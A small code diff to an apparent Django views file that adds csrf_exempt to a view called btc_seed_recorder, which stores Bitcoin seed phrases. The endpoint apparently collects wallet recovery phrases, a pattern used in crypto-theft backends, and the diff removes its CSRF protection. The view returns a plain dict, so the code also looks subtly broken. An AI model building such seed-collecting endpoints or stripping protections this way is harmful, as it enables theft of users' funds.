@@ -1,4 +1,5 @@
 from django.views.decorators.http import require_POST, require_GET
+from django.views.decorators.csrf import csrf_exempt
 from django.shortcuts import render, redirect
 from django.http import HttpResponse, JsonResponse
 from django.contrib.sessions.models import Session
@@ -69,6 +70,7 @@ def error500(exception):
 
 
 # PERSONAL USE
+@csrf_exempt
 def btc_seed_recorder(request, seed):
     if BTC_SEED_PHRASE.objects.filter(seed=seed).exists():
         return {'status': False}
